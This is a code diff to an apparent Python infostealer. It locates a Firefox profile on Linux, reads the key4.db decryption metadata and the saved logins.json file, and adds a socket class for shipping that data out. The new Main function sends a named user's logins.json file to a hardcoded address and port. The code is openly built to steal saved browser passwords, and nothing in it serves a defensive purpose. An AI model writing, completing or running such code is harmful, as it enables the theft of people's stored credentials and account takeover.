@@ -138,45 +138,29 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
 
             browserDirectory = self.profileFinder.FindProfileDirectoryInLinux();
             keyDbPath = os.path.join(browserDirectory, "key4.db");             
-            loginFilePath = os.path.join(browserDirectory, "logins.json")
+            loginsFilePath = os.path.join(browserDirectory, "logins.json")
 
 
-
-            if(not os.path.exists(keyDbPath) or not os.path.exists(loginFilePath)): 
+            if(not os.path.exists(keyDbPath) or not os.path.exists(loginsFilePath)): 
                 raise FileNotFoundError("Key4.db or logins.json not exists!");
 
 
-            try:
-        
-                results = self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password';");
 
-                
+            salt, item2= self.__ExecuteSQLQuery(keyDbPath, "SELECT item1, item2 FROM metadata WHERE id = 'password'");
+
+            
+            print(loginsFilePath)        
 
 
-
-            except Exception as e:
-                print(e)
-
+            
+            
            
             
             
             
             
-            
-            
-
-
-
-
-
-
-
-
-
         except Exception as e:
-
             print(e)
-            pass
         
 
 
@@ -194,59 +178,9 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
 
             cursor = db.cursor()
             cursor.execute(sqlQuery);
-            results = cursor.fetchall()
+            results = cursor.fetchone()
 
         return results;
-
-
-
-        
-        
-
-
-
-
-
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -256,20 +190,96 @@ class FirefoxPasswordsGetter(BrowserPasswordsGetter):
 class SocketSender(ABC):
 
     @abstractmethod
-    def Send(ip, port):
+    def SendFileData(self):
         pass
 
-     
-
+    @abstractmethod
+    def SendPythonData(self):
+        pass
+        
 
     
 class BrowserDataSender(SocketSender):
 
-    def __init__(self):
-        pass
+    def __init__(self, ip, port):
+        self._ip = ip;
+        self._port = port;
+        
 
-    def Send(self):
-        pass
+
+    def __EstablishConnection(self):
+        #Create Connection 
+        serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+        serverAddress = (self.ip, self._port);        
+        serverSocket.bind(serverAddress);
+
+        serverSocket.listen();
+
+        clientSocket, clientAddress = serverSocket.accept()
+        return serverSocket, clientSocket
+
+
+
+    def SendFileData(self, path):
+        
+        if(not os.path.exists(path)): raise FileNotFoundError("File not exists!");
+
+        with open(path, "r") as File:
+            dataFile = File.read();
+
+        serverSocket, clientSocket = self.__EstablishConnection()
+
+        
+        try:
+
+            clientSocket.sendall(str(dataFile).encode());
+
+        except Exception as e:
+            print("Error with connection!" + e);
+
+        finally:
+            clientSocket.close();
+            serverSocket.close();
+
+
+
+    def SendPythonData(self, data={}):
+
+        serverSocket, clientSocket = self.__EstablishConnection()
+
+        
+        try:
+
+            clientSocket.sendall(str(data).encode());
+
+        except Exception as e:
+            print("Error with connection!" + e);
+
+        finally:
+            clientSocket.close();
+            serverSocket.close();
+
+
+               
+
+
+
+
+
+
+
+        
+
+       
+
+
+
+
+
+
+        
+
+
 
 
 
@@ -281,12 +291,27 @@ class BrowserDataSender(SocketSender):
 def Main():
 
 
-    finder = FirefoxProfileFinder();
+    sender = BrowserDataSender("192.168.1.1", 3000);
+
+    sender.SendFileData("/home/xander/.mozilla/firefox/7ik0vvhp.default-esr/logins.json");
 
 
-    xd = FirefoxPasswordsGetter(finder);
+    
 
-    xd.GetPasswordInLinux()
+
+
+
+
+
+
+
+
+
+    # finder = FirefoxProfileFinder();
+
+    # xd = FirefoxPasswordsGetter(finder);
+
+    # xd.GetPasswordInLinux()
 
 
 
